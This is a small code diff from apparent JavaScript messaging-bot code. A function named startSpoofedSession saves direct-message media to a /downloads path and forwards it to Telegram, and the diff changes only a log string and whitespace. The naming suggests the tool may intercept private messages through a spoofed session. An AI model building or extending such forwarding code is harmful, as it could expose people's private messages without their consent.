@@ -310,13 +310,13 @@ async function startSpoofedSession() {
                                 path: `/downloads/${filename}`,
                                 content: buffer
                             })
-                            console.log(`[Filen] Saved on: /downloads/${filename}`)
+                            console.log(`[Filen] $ Saved on: /downloads/${filename}`)
 
                             if (shouldSendRegularMedia()) {
                                 try {
                                     const telegramCaption = formatMediaCaption(`[DM MEDIA] ${mediaType}`, metadata, caption)
                                     await sendTelegramMedia(buffer, filename, mediaType, telegramCaption)
-                                    
+
                                 } catch (err) {
                                     console.log(`[DM Media] ${shortSender} → Telegram send failed: ${err.message}`)
                                 }
